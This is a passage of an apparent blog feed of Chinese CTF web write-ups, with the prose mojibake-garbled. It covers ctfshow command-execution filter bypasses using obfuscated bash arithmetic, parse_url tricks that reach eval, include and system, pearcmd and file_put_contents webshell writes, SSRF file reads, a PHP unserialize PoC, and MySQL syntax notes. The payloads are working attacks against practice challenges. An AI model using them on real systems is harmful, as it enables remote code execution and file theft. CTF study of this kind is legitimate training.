<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">str= &quot;&quot;</span><br><span class="line">for i in range(255):</span><br><span class="line">    data = &#123;&#x27;ctf_show&#x27;:chr(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    if &quot;??????&quot; in retext:</span><br><span class="line">        print(1)</span><br><span class="line">    else:</span><br><span class="line">        str += chr(i)</span><br><span class="line"> </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()0&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>1æ²¡äº†æ„é€ 1,$: ç¬¬ä¸€ä¸ª#æ˜¯è®¡ç®—å­—ç¬¦é•¿åº¦ï¼Œç¬¬äºŒä¸ª#æ˜¯å­—ç¬¦ä¸²çš„åå­—ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;##&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="æé™å‘½ä»¤æ‰§è¡Œ5"><a href="#æé™å‘½ä»¤æ‰§è¡Œ5" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ5"></a>æé™å‘½ä»¤æ‰§è¡Œ5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹ï¼Œè¿˜å‰© <code>! $ &amp; &#39; ()&lt;+\-&#123;&#125;~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(())</span><br><span class="line">ç»“æœä¸º0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$(())\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/GTL-JU/p/17128363.html">ctfshow-æé™å‘½ä»¤æ‰§è¡Œå¤ç° - GTL_JU - åšå®¢å›­ (cnblogs.com)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(8) &#123;</span><br><span class="line">  [&quot;scheme&quot;]=&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [&quot;port&quot;]=&gt;</span><br><span class="line">  int(9090)</span><br><span class="line">  [&quot;user&quot;]=&gt;</span><br><span class="line">  string(8) &quot;username&quot;</span><br><span class="line">  [&quot;pass&quot;]=&gt;</span><br><span class="line">  string(8) &quot;password&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(5) &quot;/path&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(9) &quot;arg=value&quot;</span><br><span class="line">  [&quot;fragment&quot;]=&gt;</span><br><span class="line">  string(6) &quot;anchor&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://system(&quot;cd%20..;cd%20..;cd%20..;tac%20fl*&quot;);</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=aa://eval(base64_decode(&#x27;c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs=&#x27;));/aaa</span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://data:://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgL18qIik/Pg==</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=data::;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=http://cd%20..;cd%20..;cd%20..;tac%201*</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=ctfshow://`echo &#x27;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==&#x27;|base64 -d`/h1xa</span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure>

<p>å˜é‡è¦†ç›–</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=user://pass:query@scheme/?fragment%23data://,&lt;?php system(&#x27;cat /_f1ag_1s_h3ree&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=ctfshow://&lt;script language=&#x27;php&#x27;&gt;eval($_POST[1]);/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>å†™å…¥shell</p>
]]></content>
  </entry>
  <entry>
    <title>mysqlè¯­æ³•</title>
    <url>/2023/02/16/mysql/</url>
    <content><![CDATA[<p>mysqlè¯­æ³•</p>
  <span id="more"></span>

<p><a href="https://blog.csdn.net/mshxuyi/article/details/88046146">(3æ¡æ¶ˆæ¯) ï¼­ySQL åˆ›å»ºæ•°æ®åº“&#x2F;è¡¨&#x2F;å­—æ®µ_æ•°æ®åº“å»ºè¡¨å­—æ®µ_tom.maçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="https://blog.csdn.net/ThinkWon/article/details/106610831">(3æ¡æ¶ˆæ¯) MySQLåˆ é™¤è¡¨çš„ä¸‰ç§æ–¹å¼_mysqlæ€ä¹ˆåˆ é™¤è¡¨_ThinkWonçš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><p>mysql æ•°æ®åº“è¯­æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p  #ç™»é™†mysql å¯†ç ä¸ºç©ºç›´æ¥å›è½¦è¿›å…¥</span><br></pre></td></tr></table></figure>

<p>MySQL ä¿®æ”¹å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;newpasswd&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); æˆ–è€…</span><br><span class="line">update user set password = PASSWORD(&#x27;è¦æ›´æ¢çš„å¯†ç &#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privilegesï¼›</span><br></pre></td></tr></table></figure>

<p><strong>1ã€æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼’ã€åˆ›å»ºæ•°æ®åº“ school</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database school default character set utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼“ã€è¿›å…¥school æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use school;</span><br></pre></td></tr></table></figure>

<p><strong>4ã€æ˜¾ç¤ºå½“å‰æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| school     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>5ã€åˆ›å»ºç©ºè¡¨ student</p>
<p>mysql&gt; create table student;</p>
<p>6ã€åˆ›å»ºå¸¦å­—æ®µçš„è¡¨ student (id,name,age)</p>
<pre><code>#id æ•´å‹ ä¸»å»º ä¸èƒ½ä¸ºç©º è‡ªåŠ¨å¢é•¿
#name å­—ç¬¦å‹é•¿åº¦50 ä¸èƒ½ä¸ºç©º
#age æ•´å‹ ä¸èƒ½ä¸ºç©º é»˜è®¤å€¼18
 
mysql&gt; create table student(
    -&gt; id int primary key not null auto_increment,
    -&gt; name varchar(50) not null,
    -&gt; age int not null default 18
    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre>
<p>7ã€æŸ¥è¯¢æ‰€æœ‰è¡¨</p>
<p>mysql&gt; show tables;</p>
<p>8ã€æŸ¥è¯¢è¡¨ç»“æ„</p>
<pre><code>mysql&gt; desc student;
+-------+-------------+------+-----+---------+----------------+
| Field | Type        | Null | Key | Default | Extra          |
+-------+-------------+------+-----+---------+----------------+
| id    | int(11)     | NO   | PRI | NULL    | auto_increment |
| name  | varchar(50) | NO   |     | NULL    |                |
| age   | int(11)     | NO   |     | 18      |                |
+-------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
</code></pre>
<p>9ã€æŸ¥è¯¢è¡¨çš„è¯¦ç»†ä¿¡æ¯</p>
<pre><code>mysql&gt; show create table student;
</code></pre>
<p>10ã€æ’å…¥æ•°æ®</p>
<pre><code>mysql&gt; insert into student (name,age) values
     &gt; (&#39;tom&#39;,20),
     &gt; (&#39;alice&#39;,16),
     &gt; (&#39;helen&#39;,22);
</code></pre>
<p>11ã€æ¸…ç©ºæ•°æ®è¡¨å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">truncate table student;</span><br></pre></td></tr></table></figure>

<p>12ã€å¤åˆ¶è¡¨ç»“æ„ï¼Œè¡¨æ•°æ®</p>
<pre><code>#æ–¹æ³•ä¸€
mysql&gt; create table student_2 like student;  #åˆ›å»ºstudent_2è¡¨ å¹¶å¤åˆ¶studentè¡¨ç»“æ„
mysql&gt; insert into student_2 select * from student;  #å¤åˆ¶studentè¡¨æ•°æ®åˆ°student_2ä¸­
 
#æ–¹æ³•äºŒ
create table student3 select * from student;  #åˆ›å»º student3 å¹¶å¤åˆ¶studentè¡¨ç»“æ„å’Œæ•°æ®
</code></pre>
<p>13ã€é‡å‘½åè¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename table student_3 to student_4  #é‡å‘½åè¡¨ä¸ºstudent_4</span><br></pre></td></tr></table></figure>

<p>14.åˆ é™¤ user è¡¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table user;    #drop æ˜¯ç›´æ¥åˆ é™¤è¡¨ä¿¡æ¯ï¼Œé€Ÿåº¦æœ€å¿«ï¼Œä½†æ˜¯æ— æ³•æ‰¾å›æ•°æ®</span><br><span class="line">truncate table user;   #truncate æ˜¯åˆ é™¤è¡¨æ•°æ®ï¼Œä¸åˆ é™¤è¡¨çš„ç»“æ„ï¼Œä½†ä¸èƒ½ä¸whereä¸€èµ·ä½¿ç”¨</span><br><span class="line">delete from user;   #delete æ˜¯åˆ é™¤è¡¨ä¸­çš„æ•°æ®ï¼Œä¸åˆ é™¤è¡¨ç»“æ„</span><br><span class="line">delete from user where user_id = 1;  </span><br></pre></td></tr></table></figure>

<p>15.ä¿®æ”¹å­—æ®µå†…å®¹</p>
<p>å°†nameä¸ºtomçš„è®°å½•çš„ageè®¾ç½®ä¸º20å¹¶å°†å…¶genderè®¾ç½®ä¸ºfemale MySQLå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<p>load_file(file_name)</p>
<p>å…¶ä¸­file_nameæ˜¯æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚</p>
<p>ä¸‹é¢æ˜¯æˆ‘ä»ä¸€ä¸ªæ–‡ä»¶ä¸­é€‰æ‹©å†…å®¹çš„ç¤ºä¾‹:</p>
<p>select load_file(â€˜&#x2F;data&#x2F;test.txtâ€™) as result;</p>
<p><strong>IFè¡¨è¾¾å¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ expr1 æ˜¯TRUE (æˆ–è€…expr1 &lt;&gt; 0 ä¸” expr1 &lt;&gt; NULL)ï¼Œåˆ™ IF()çš„è¿”å›å€¼ä¸ºexpr2; å¦åˆ™è¿”å›å€¼åˆ™ä¸º expr3ã€‚IF() çš„è¿”å›å€¼ä¸ºæ•°å­—å€¼æˆ–å­—ç¬¦ä¸²å€¼ï¼Œå…·ä½“æƒ…å†µè§†å…¶æ‰€åœ¨è¯­å¢ƒè€Œå®šã€‚</p>
<p>substrå‡½æ•°æ ¼å¼ (ä¿—ç§°ï¼šå­—ç¬¦æˆªå–å‡½æ•°)</p>
<p>æ ¼å¼1ï¼š substr(string str, int a, int b);<br>æ ¼å¼2ï¼š substr(string str, int a) ;</p>
<p>è§£é‡Šï¼š</p>
<p>æ ¼å¼1ï¼š<br>    1ã€str éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²<br>    2ã€a   æˆªå–å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®<br>    ï¼ˆæ³¨ï¼šå½“aç­‰äº1æ—¶ï¼Œä»ç¬¬ä¸€ä½å¼€å§‹æˆªå–;å½“aç­‰äº0æ—¶ï¼Œæ— æˆªå–å­—ç¬¦ä¸²ï¼‰<br>    3ã€b   è¦æˆªå–çš„å­—ç¬¦ä¸²çš„é•¿åº¦</p>
<p>æ ¼å¼2ï¼š<br>    1ã€str éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²<br>    2ã€a   å¯ä»¥ç†è§£ä¸ºä»ç¬¬aä¸ªå­—ç¬¦å¼€å§‹æˆªå–åé¢æ‰€æœ‰çš„å­—ç¬¦ä¸²ã€‚</p>
<p>SQLå‡½æ•°Group_concatç”¨æ³•</p>
<p>æ‹¼æ¥å­—ç¬¦ä¸²</p>
<p><a href="https://blog.csdn.net/qq_35531549/article/details/90383022">(6æ¡æ¶ˆæ¯) SQLå‡½æ•°Group_concatç”¨æ³•_group_concat sql_å¯¸è‰å¿ƒ2130çš„åšå®¢-CSDNåšå®¢</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>nss1</title>
    <url>/2023/04/14/nss1/</url>
    <content><![CDATA[<p>  éƒ¨åˆ†nssçš„é¢˜</p>
  <span id="more"></span>

<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-jicao"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-jicao" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]jicao"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]jicao</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/function.json-encode.php">PHP: json_encode - Manual</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">post id=wllmNB</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p>æ‰“å¼€åéšä¾¿curlä¸€ä¸‹è¯•è¯•</p>
<p><code>http://127.0.0.1/flag</code></p>
<p>çœ‹åˆ°ï¼šéƒ½è¯´äº†è¿™é‡Œçœ‹ä¸äº†flagã€‚ã€‚ä½†æ˜¯å¯ä»¥çœ‹çœ‹æç¤ºæ–‡ä»¶ï¼š&#x2F;fl4g</p>
<p>æ‰¾ä¸åˆ°æ‰“ä¸å¼€</p>
<p>æ¢æˆphpä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///fl4g</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ªæ æ„æ€æ ¹ç›®å½•ä¸‹çš„fl4g</p>
<p>å‡ºç°äº†</p>
<p>ä½ åº”è¯¥çœ‹çœ‹é™¤äº†index.phpï¼Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸ªha1x1ux1u.php</p>
<p>æ„æ€æ˜¯åœ¨ha1x1ux1u.phpä¸index.phpåŒä¸€ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;ä½ è´¥äº†.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶æç¤ºåœ¨æ ¹ç›®å½•ä¸‹å«flag,ä¹Ÿæ‡’å¾—ç”¨ä¼ªåè®®æ‰¾äº†</p>
<p>NSSCTF{0c36f2e6-8b20-4fa3-ab78-9ee0e0725d40}</p>
<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($p)</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $admin=&#x27;admin&#x27;;</span><br><span class="line">    public $passwd=&#x27;ctf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new wllm();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰§è¡Œ__construct</p>
<p>åèµ‹å€¼ï¼ŒåŠ æ·±ä¸€ä¸‹å°è±¡</p>
